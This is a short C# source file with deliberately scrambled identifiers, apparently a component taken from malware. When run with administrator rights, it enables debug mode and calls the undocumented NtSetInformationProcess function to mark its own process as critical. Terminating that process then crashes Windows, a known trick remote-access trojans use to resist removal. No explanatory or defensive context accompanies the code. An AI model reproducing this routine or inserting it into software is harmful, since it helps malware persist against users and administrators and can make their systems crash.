using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace ALzLGBAFaCqNDAE;

public static class GtGubEhkBUXwa
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr bKTrJHBCdNzK, int CxJpvyVoqKAv, ref int luvFDvlMZnLCp, int MsytznKLZiISLb);

	public static void WMVeoEWRQny()
	{
		if (ilMBflUuabHCSp())
		{
			wgqOPcDBTPcx();
		}
	}

	public static void wgqOPcDBTPcx()
	{
		int luvFDvlMZnLCp = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref luvFDvlMZnLCp, 4);
	}

	public static bool ilMBflUuabHCSp()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
